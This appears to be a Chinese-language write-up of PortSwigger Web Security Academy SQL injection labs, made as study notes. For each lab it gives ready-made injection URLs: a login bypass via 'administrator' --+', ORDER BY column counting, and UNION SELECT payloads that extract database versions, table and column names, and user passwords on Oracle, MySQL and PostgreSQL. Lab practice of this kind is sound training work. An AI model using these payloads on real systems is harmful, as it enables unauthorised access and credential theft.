# SQL injection

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> 最基础的SQL注入，由于题目中已经告诉了语句格式，即告诉了`category`字段为单引号闭合，实际测试中可能需要花费一定时间去判断*脆弱字段*和*闭合形式*。

随便选择一个类别，然后修改类别名为不存在的名称，例如`abc`，然后进行单引号闭合，加入OR语句`or 1=1`，最后进行注释`--+`以使SQL语句成立，最后请求URL即为`https://xxxxxxx.web-security-academy.net/filter?category=abc'%20or%201%3D1--+`。

## SQL injection vulnerability allowing login bypass

> 也是基础的SQL注入，题目要求登录`administrator`用户，那么用户名输入`administrator' --+`即可。实际中，可能需要测试一下闭合形式，我最开始是没有单引号的，发现失败了，就结合上一题（信息收集）测试一下单引号即可。

点击`My Account`进入登陆界面，用户名输入`administrator' --+`，密码任意输入（防止有检测空密码的JavaScript代码阻止登录），最后请求包数据为`csrf=xxxxxxx&username=administrator%27%20--%2B&password=administrator`

## SQL injection attack, querying the database type and version on Oracle

> 基本的思路就是`union`一个查询数据库版本的语句，然后让其回显。

由于我对Oracle的语句并不熟悉，所以我参考了[一些资料](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

通过`' and 1=1--+`和`' and 1=2--+`确定是单引号闭合之后，就可以开始判断当前表的列数。

第一步需要判断当前表的列数（因为这关乎我们之后select语句返回数据的数量），可以通过`order by`语句进行测试，会发现`order by 3`时会报错，`order by 2`时正常，那么可以判断当前表有两列，即`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+order+by+2--+`。

接下来就可以开始使用`union`语句确定回显。在MySQL中，我们可以通过`select 1,2`的语句进行测试回显，但在Oracle中，必须要包含`from table`，所以我们使用`select '1','2' from dual`来进行测试（需要使用字符串而非数字，具体原因我不太清楚，之后如果系统了解Oracle应该会涉及）。*dual是Oracle的一个实际存在的表，常用在没有目标表的select语句中*。请求URL为`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,%272%27+from+dual--+`，我们会发现两部分都会回显。

通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
`，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。

## SQL injection attack, querying the database type and version on MySQL and Microsoft

> 与上一个一样，不过就是后端不一样，换一些语法就可以了。

`https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`

你也可以使用`version()`来替代`@@version`，这是我在下一个Lab中发现的，`version()`适用于所有非Oracle的数据库，但`@@version`仅适用于MySQL和Microsoft。

## SQL injection attack, listing the database contents on non-Oracle databases

> 可以先通过注入查询数据库得到用户名密码，最后再登录。

可以通过`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,version()--+`来进行初步测试，确定后端为`PostgreSQL`。

同样使用[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的Payload，我们可以通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+information_schema.tables--+`查看数据库表名，使用`ABC`这个不存在的category是为了去掉原本正常的数据。

搜索关键字`user`，挑选一个可能性较大的表，例如`pg_user`，通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+information_schema.columns+where+table_name=%27pg_user%27--+`查询其列名，会发现有`usename`和`passwd`两列。

最后通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+usename,passwd+from+pg_user--+`，但是发现这里只有两个用户`peter`和`postgres`，所以我们表找错了。最后再查看一次所有表，觉得`users_alyjev`可能也较大，进行查询后得到用户名密码，登录即可。

## SQL injection attack, listing the database contents on Oracle

> 思路与上一个Lab一样，不过后端是Oracle。

通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+all_tables--+`查询所有表名，我们先选择`USERS_VSCHVE`这个表进行查询`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+all_tab_columns+where+table_name=%27USERS_VSCHVE%27--+`，然后查询用户名密码`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+USERNAME_LBWZOB,PASSWORD_JXBWPH+from+USERS_VSCHVE--+`，最后登录即可。

## SQL injection UNION attack, determining the number of columns returned by the query

> 关键点在于通过`order by`判断有几列，然后根据题目要求添加一行空数据即可。

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27%20order%20by%203--+`

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`

## SQL injection UNION attack, finding a column containing text

> 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。

`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,%277ix1eZ%27,%273%27--+`
